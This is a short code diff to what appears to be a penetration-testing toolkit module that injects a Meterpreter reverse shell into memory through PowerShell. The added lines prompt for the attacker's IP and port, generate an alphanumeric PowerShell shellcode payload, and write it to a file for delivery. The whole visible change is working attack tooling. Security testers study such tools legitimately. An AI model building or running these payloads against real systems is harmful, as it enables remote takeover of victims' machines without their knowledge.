@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import pexpect
 from src.core.setcore import *
+import time
 
 print """
 The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.
@@ -16,10 +17,16 @@ filewrite = file(setdir + "/metasploit.payload", "w")
 filewrite.write(payload)
 filewrite.close()
 
-import src.payloads.powershell.prep
+ipaddr = raw_input("Enter the IP for the reverse: ")
+port = raw_input("Enter the port for the reverse: ")
 
+shellcode = generate_powershell_alphanumeric_payload(payload,ipaddr,port, "")
+filewrite = file(setdir + "/x86.powershell", "w")
+filewrite.write(shellcode)
+filewrite.close()
+
+time.sleep(3)
 fileopen = file(setdir + "/x86.powershell", "r")
-#payload_encoded = fileopen.read()
 
 # read in x amount of bytes
 data_read = int(50)
